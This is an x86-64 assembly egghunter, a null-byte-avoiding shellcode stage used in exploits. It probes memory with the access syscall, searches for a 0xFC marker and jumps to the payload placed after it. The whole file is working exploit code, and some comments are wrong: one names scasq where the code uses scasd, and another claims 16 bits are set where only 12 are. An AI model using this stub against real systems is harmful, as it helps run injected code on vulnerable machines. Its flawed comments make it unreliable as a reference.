global _start

section .text

_start:

xor rdi, rdi        ; zero out rdi

setup_page:
    or  di, 0xfff   ; setting lower 16 bits to 4095

next_address:
    inc rdi     ; moving it to 4096 while avoiding
                ; null characters 0x00

    xor rax, rax    ; zeroing out eax
    mov rsi, rax    ; zero out int mode (param 2)
    add rax, 21     ; set rax to sys_access

    syscall         ; invoke sys_access

    cmp al, 0xf2    ; al will contain 0xf2 if memory
                    ; is not valid, ie. an EFAULT

    jz setup_page   ; if the compare flag is zero then
                    ; we don't have valid memory so reset
                    ; to the next memory page and press on

    mov rax, 0xFCFCFCFCFCFCFCFC ; moving egg into rax in prep for searching

    scasd            ; do we match our egg?

    jnz next_address ; if it dosent match increase memory by one byte
                     ; and try again

    scasd            ; do we match our egg?

    jnz next_address ; if this is not zero it's not a match
                     ; so on we will press increasing memory one more byte

    jmp rdi      ; if we got this far then we found our egg and our
                 ; memory address is already at the right place due
                 ; to scasq increasing by 4 bytes on each search
